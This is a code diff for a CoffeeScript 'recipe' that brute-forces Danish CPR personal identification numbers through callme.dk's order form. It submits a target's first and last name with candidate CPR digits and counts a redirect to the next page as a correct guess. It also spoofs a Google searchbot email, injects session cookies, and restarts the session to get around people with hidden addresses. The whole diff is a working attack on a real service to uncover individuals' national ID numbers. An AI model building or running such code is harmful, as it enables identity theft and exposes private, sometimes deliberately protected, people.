@@ -6,7 +6,7 @@ querystring = require("querystring")
 class @Callme extends Recipe.Recipe
 
   # constructor
-  constructor: (inputData, socket) ->
+  constructor: (inputData, socket, session_cookie) ->
     console.log("Callme constructor")
 
     # important: following vars must be defined
@@ -18,7 +18,6 @@ class @Callme extends Recipe.Recipe
     @req =
       url: 'https://www.callme.dk/pow-basic/4'
       method: 'POST'
-      #encoding: "ISO-8859-1"
       data:
         task: "submitOrderPersonalInfo",
         email: "searchbot@google.com",
@@ -39,8 +38,41 @@ class @Callme extends Recipe.Recipe
         firstName: inputData["firstName"]
         lastName: inputData["lastName"]
 
+    @settings = 
+      urlencoding: 'iso'
+
+    if session_cookie?
+      @req.data.cookie = session_cookie
+
   updateCPR: ->
     @req.data.CPR2 = @inputData["cprList"][@counter]
+
+  getResponse: (req, res, callback) ->
+    cpr = querystring.parse(req.data).CPR1 + querystring.parse(req.data).CPR2
+    msg = $(res.body).find("#orderForm .error").text()
+
+    # Skjult adresse problem: folk med skjult adresse påkræves at indtaste yderligere data. Hvis man rammer et sådant CPR nummer er eneste løsning pt. at fortsætte med ny session cookie
+    if res.body.indexOf("din adresse er hemmelig") > 0    
+
+      @inputData.cprList = @inputData.cprList.slice(@counter + 1,@inputData.cprList.length);
+
+      console.log("Restarting with: ")
+      console.log @inputData.cprList
+
+      @constructor(@inputData, @socket)
+      @prepareRequest () =>        
+        callback(cpr, "error", msg)
+        console.log("Secret: "+ cpr)
+
+      return false
+
+    # A 302 redirect to /5 is a success
+    if res.status_code is "302" and res.location is "http://www.callme.dk/pow-basic/5"
+      callback cpr, "success", ""
+      console.log("Succes: "+ cpr)
+    else
+      callback cpr, "error", msg
+      console.log("Incorrect CPR: "+ cpr)
 
   prepareRequest: (startBruteForce) ->
     self = @
@@ -107,16 +139,6 @@ class @Callme extends Recipe.Recipe
         self.step3 res, (req, res, err) -> self.waitForClient "step3", req, res, err, (res) ->
           self.step4 res, (req, res, err) -> self.waitForClient "step4", req, res, err, (res) ->
             console.log("Preperation finished")
-            startBruteForce()          
-
-  # Extend object: receive response
-  getResponse: (req, res, callback) ->
-    cpr = querystring.parse(req.data).CPR1 + querystring.parse(req.data).CPR2
-    console.log(cpr)
-
-    # A 302 redirect to /5 is a success
-    if res.statusCode is 302 and res.headers.location is "http://www.callme.dk/pow-basic/5"
-      callback cpr, "success"
-    else
-      status = $(res.body).find("#orderForm .mobiltelefoner .block01 .inner03 .error").text()
-      callback cpr, status
+            startBruteForce() 
+            
+module.exports = @Callme
